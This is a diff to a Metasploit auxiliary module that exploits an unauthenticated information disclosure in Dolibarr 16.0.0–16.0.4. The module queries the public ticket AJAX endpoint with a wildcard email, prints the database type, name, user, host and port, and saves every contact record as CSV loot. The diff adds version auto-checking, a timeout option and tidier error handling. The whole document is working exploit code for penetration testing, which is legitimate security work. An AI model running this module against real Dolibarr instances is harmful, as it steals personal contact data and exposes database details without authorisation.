@@ -8,6 +8,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Module::Failure
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -35,14 +36,16 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://github.com/Dolibarr/dolibarr/blob/16.0.5/ChangeLog#L34'],
           ['URL', 'https://github.com/Dolibarr/dolibarr/commit/bb7b69ef43673ed403436eac05e0bc31d5033ff7'],
           ['URL', 'https://github.com/Dolibarr/dolibarr/commit/be82f51f68d738cce205f4ce5b469ef42ed82d9e']
-        ]
+        ],
+        'DefaultOptions' => {
+          'HttpClientTimeout' => 20
+        }
       )
     )
     register_options(
       [
         Opt::RPORT(80),
         OptString.new('TARGETURI', [true, 'Path to Dolibarr instance', '/'])
-
       ]
     )
   end
@@ -57,53 +60,44 @@ class MetasploitModule < Msf::Auxiliary
 
     version = res.body.scan(/Dolibarr ([\d.]+-*[a-zA-Z0-9]*)/).flatten.first
 
+    return Exploit::CheckCode::Detected('Dolibarr version not found - proceeding anyway...') if version.blank?
+
     if Rex::Version.new(version).between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
-      print_good("Detected vulnerable Dolibarr version: #{version}")
-      return Exploit::CheckCode::Appears
-    elsif version.blank?
-      print_warning('Dolibarr version not found - proceeding anyway...')
-      return Exploit::CheckCode::Detected
-    else
-      print_warning("Detected apparently non-vulnerable Dolibarr version: #{version} - proceeding anyway...")
-      return Exploit::CheckCode::Detected
+      return Exploit::CheckCode::Appears("Detected vulnerable Dolibarr version: #{version}")
     end
+
+    return Exploit::CheckCode::Safe("Detected apparently non-vulnerable Dolibarr version: #{version}")
   end
 
-  def exploit(ip)
-    res = send_request_cgi!({
+  def run_host(ip)
+    res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, '/public/ticket/ajax/ajax.php'),
       'vars_get' => {
         'action' => 'getContacts',
         'email' => '%'
       }
-    }, 90, true)
+    }, datastore['HttpClientTimeout'], true)
+
+    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response - try increasing HttpClientTimeout") if res.nil?
+    fail_with(Failure::UnexpectedReply, "Exploit response code: #{res.code}") if res.code != 200
 
     res_json_document = res.get_json_document
 
-    if res && res.code != 200
-      fail_with(Failure::UnexpectedReply, "Exploit response code: #{res.code}")
-    elsif res_json_document.nil?
-      fail_with(Failure::UnexpectedReply, 'Dolibarr database empty')
-    end
+    fail_with(Failure::UnexpectedReply, 'Dolibarr data did not include contacts field') if res_json_document['contacts'].blank?
 
     contacts = res_json_document['contacts']
-    fail_with(Failure::UnexpectedReply, 'Dolibarr data did not include contacts field') if contacts.blank?
 
-    begin
-      print_good("Database type: #{contacts[0]['db']['type']}")
-      print_good("Database name: #{contacts[0]['db']['database_name']}")
-      print_good("Database user: #{contacts[0]['db']['database_user']}")
-      print_good("Database host: #{contacts[0]['db']['database_host']}")
-      print_good("Database port: #{contacts[0]['db']['database_port']}")
-    end
+    print_good("Database type: #{contacts.dig(0, 'db', 'type') || '<not found>'}")
+    print_good("Database name: #{contacts.dig(0, 'db', 'database_name') || '<not found>'}")
+    print_good("Database user: #{contacts.dig(0, 'db', 'database_user') || '<not found>'}")
+    print_good("Database host: #{contacts.dig(0, 'db', 'database_host') || '<not found>'}")
+    print_good("Database port: #{contacts.dig(0, 'db', 'database_port') || '<not found>'}")
 
     contact_fields = contacts[0].keys
     contact_fields.delete('db') # We do not want this in the csv
 
-    contact_entry_data = []
-
-    nbr_contact = contacts.length.to_i
+    nbr_contact = contacts.length
 
     path_json_file = store_loot(
       'dolibarr',
@@ -118,16 +112,14 @@ class MetasploitModule < Msf::Auxiliary
 
     csv_string = CSV.generate do |csv| # Loop to write into csv
       csv << contact_fields
-      nbr_contact.times do |num| # Loop on every contact
-        contact_fields.each do |element|
-          if contacts[num][element.to_s].is_a?(String) || contacts[num][element.to_s].is_a?(Int)
-            contact_entry_data << contacts[num][element.to_s].to_s.gsub("\r\n", ' ')
+      contacts.each do |contact|
+        csv << contact_fields.map do |element|
+          if contact[element.to_s].is_a?(String) || contact[element.to_s].is_a?(Integer)
+            contact[element.to_s]&.to_s.strip || ''
+          else
+            ''
           end
-        rescue StandardError
-          contact_entry_data << ' '
         end
-        csv << contact_entry_data
-        contact_entry_data.clear
       end
     end
 
@@ -140,13 +132,6 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     print_good("#{rhost}:#{rport} - File saved in: #{path_csv_file}")
-  end
-
-  def run_host(ip)
-    check_code = check
-    if check_code == Exploit::CheckCode::Appears || check_code == Exploit::CheckCode::Detected
-      exploit(ip)
-    end
   end
 
 end
